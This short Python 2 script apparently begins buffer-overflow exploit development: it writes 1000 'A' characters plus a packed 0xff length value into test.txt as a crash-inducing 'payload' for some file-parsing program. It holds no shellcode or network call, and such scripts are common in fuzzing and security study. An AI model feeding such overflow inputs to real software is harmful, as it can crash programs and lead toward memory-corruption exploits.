import  struct

print "[+] create file..."

length = struct.pack('<L', 0xff)
dummy = "A" * 1000 + length
payload = dummy

f = open("test.txt", "w")
f.write(payload)
f.close()
